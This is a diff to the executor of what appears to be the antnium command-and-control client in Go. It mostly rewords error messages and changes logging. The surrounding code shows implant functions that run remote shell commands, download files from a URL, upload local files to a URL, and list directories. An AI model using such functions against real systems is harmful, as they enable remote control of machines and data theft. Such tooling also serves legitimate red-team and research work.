@@ -12,7 +12,6 @@ import (
 	"github.com/dobin/antnium/pkg/arch"
 	"github.com/dobin/antnium/pkg/common"
 	"github.com/dobin/antnium/pkg/model"
-	log "github.com/sirupsen/logrus"
 )
 
 type Executor struct {
@@ -33,13 +32,7 @@ func MakeExecutor() Executor {
 func (p *Executor) Execute(packet model.Packet) (model.Packet, error) {
 	var err error
 
-	log.WithFields(log.Fields{
-		"1_computerId":   packet.ComputerId,
-		"2_packetId":     packet.PacketId,
-		"3_downstreamId": packet.DownstreamId,
-		"4_packetType":   packet.PacketType,
-		"5_arguments":    packet.Arguments,
-	}).Info("Exec")
+	common.LogPacket("Exec", packet)
 
 	switch packet.PacketType {
 	case "ping":
@@ -107,7 +100,7 @@ func (p *Executor) actionInteractiveShellIssue(packetArgument model.PacketArgume
 	// Check and transform input
 	commandline, ok := packetArgument["commandline"]
 	if !ok {
-		return ret, fmt.Errorf("No argument 'commandline' given")
+		return ret, fmt.Errorf("missing argument 'commandline'")
 	}
 
 	stdout, stderr, err := p.interactiveShell.Issue(commandline)
@@ -172,15 +165,15 @@ func (p *Executor) actionFiledownload(packetArgument model.PacketArgument) (mode
 	// Check and transform input
 	remoteurl, ok := packetArgument["remoteurl"]
 	if !ok {
-		return ret, fmt.Errorf("No argument 'remoteUrl' given")
+		return ret, fmt.Errorf("missing argument 'remoteUrl'")
 	}
 	destination, ok := packetArgument["destination"]
 	if !ok {
-		return ret, fmt.Errorf("No argument 'destination' given")
+		return ret, fmt.Errorf("missing argument 'destination'")
 	}
 	//if _, err := os.Stat(destination); !errors.Is(err, fs.ErrNotExist) { // GO1.16
 	if _, err := os.Stat(destination); err == nil {
-		return ret, fmt.Errorf("Destination %s already exists", destination)
+		return ret, fmt.Errorf("destination file %s already exists", destination)
 	}
 
 	// Download and write file
@@ -200,7 +193,7 @@ func (p *Executor) actionFiledownload(packetArgument model.PacketArgument) (mode
 		return ret, err
 	}
 
-	ret["response"] = fmt.Sprintf("Written %d bytes", written)
+	ret["response"] = fmt.Sprintf("Written: %d bytes to %s", written, destination)
 	return ret, nil
 }
 
@@ -210,15 +203,15 @@ func (p *Executor) actionFileupload(packetArgument model.PacketArgument) (model.
 	// Check and transform input
 	remoteurl, ok := packetArgument["remoteurl"]
 	if !ok {
-		return ret, fmt.Errorf("No argument 'remoteurl' given")
+		return ret, fmt.Errorf("missing argument 'remoteurl'")
 	}
 	source, ok := packetArgument["source"]
 	if !ok {
-		return ret, fmt.Errorf("No argument 'source' given")
+		return ret, fmt.Errorf("missing argument 'source'")
 	}
 	//if _, err := os.Stat(source); errors.Is(err, fs.ErrNotExist) { // GO1.16
 	if _, err := os.Stat(source); err != nil {
-		return ret, fmt.Errorf("file %s does not exists", source)
+		return ret, fmt.Errorf("source file %s does not exist", source)
 	}
 
 	client := &http.Client{}
@@ -249,7 +242,7 @@ func (p *Executor) actionDir(packetArgument model.PacketArgument) (model.PacketR
 	// Check and transform input
 	path, ok := packetArgument["path"]
 	if !ok {
-		return ret, fmt.Errorf("No argument 'path' given")
+		return ret, fmt.Errorf("missing argument 'path'")
 	}
 
 	dirList, err := common.ListDirectory(path)
